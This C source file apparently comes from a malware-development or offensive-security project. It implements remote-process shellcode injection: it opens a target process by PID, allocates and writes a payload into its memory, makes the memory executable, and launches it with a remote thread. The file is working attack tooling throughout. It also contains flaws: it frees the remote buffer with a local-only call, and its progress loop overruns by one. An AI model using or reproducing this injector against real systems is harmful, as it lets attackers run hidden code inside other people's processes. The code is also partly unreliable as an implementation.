#include "injection.h"

VOID PrettyFormat(
        _In_ LPCSTR FunctionName,
        _In_ CONST DWORD Error
) {

    if (NULL == FunctionName || 0 == Error) {
        WARN("either you didn't supply a function name"
             "or the function actually returned successfully");
    }

    WARN("[%s] failed, error: 0x%lx", FunctionName, Error);
    return;

}

BOOL ShellcodeInjection(
        _In_ CONST DWORD PID,
        _In_ CONST PBYTE Payload,
        _In_ CONST SIZE_T PayloadSize
) {

    BOOL   STATE         = TRUE;
    HANDLE hProcess      = NULL;
    HANDLE hThread       = NULL;
    PVOID  rBuffer       = NULL;
    DWORD  OldProtection = 0;
    DWORD  TID           = 0;

    if (NULL == Payload || 0 == PayloadSize) {
        WARN("payload's not set. exiting...");
        return FALSE;
    }

    INFO("trying to get a handle on the process (%ld)...", PID);
    hProcess = OpenProcess(
            PROCESS_ALL_ACCESS, 
            FALSE, 
            PID
    );
    if (NULL == hProcess){
        PrettyFormat("OpenProcess", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] got a handle on the process!", hProcess);

    rBuffer = VirtualAllocEx(
            hProcess, 
            NULL,
            PayloadSize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
    );
    if (NULL == rBuffer) {
        PrettyFormat("VirtualAllocEx", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a buffer with PAGE_READWRITE [RW-] permissions!", rBuffer);

    if (!WriteProcessMemory(
                hProcess,
                rBuffer,
                Payload,
                PayloadSize,
                0
    )) {
        PrettyFormat("WriteProcessMemory", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    /* r/masterhacker */
    for (SIZE_T i = 0; i <= PayloadSize; i++) {
        PROG("[0x%p] [RW-] [%zu/%zu] writing payload bytes to the allocated buffer...", 
                rBuffer, 
                i, 
                PayloadSize
        );
    }
    (void)puts("");
    OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer", rBuffer, PayloadSize);

    if (!VirtualProtectEx(
                hProcess,
                rBuffer,
                PayloadSize,
                PAGE_EXECUTE_READ,
                &OldProtection
    )) {
        PrettyFormat("VirtualProtect", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed buffer's page protection to PAGE_EXECUTE_READ [R-X]", rBuffer);

    hThread = CreateRemoteThreadEx(
            hProcess,
            NULL,
            0,
            (PTHREAD_START_ROUTINE)rBuffer, 
            NULL,
            0,
            0,
            &TID 
    );
    if (NULL == hThread) {
        PrettyFormat("CreateRemoteThreadEx", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] thread created (%ld)!", hThread, TID);
    INFO("[0x%p] waiting for thread to finish execution...", hThread);
    WaitForSingleObject(hThread, INFINITE);
    INFO("[0x%p] thread finished execution, beginning cleanup...", hThread);

CLEANUP:

    INFO("beginning cleanup...");
    if (hThread) {
        CloseHandle(hThread);
        INFO("[0x%p] closed thread handle", hThread);
    }

    if (hProcess) {
        CloseHandle(hProcess);
        INFO("[0x%p] closed process handle", hProcess);
    }

    if (rBuffer) {
        VirtualFree(rBuffer, 0, MEM_RELEASE);
        INFO("[0x%p] remote buffer freed", rBuffer);
    }

    return STATE;

}
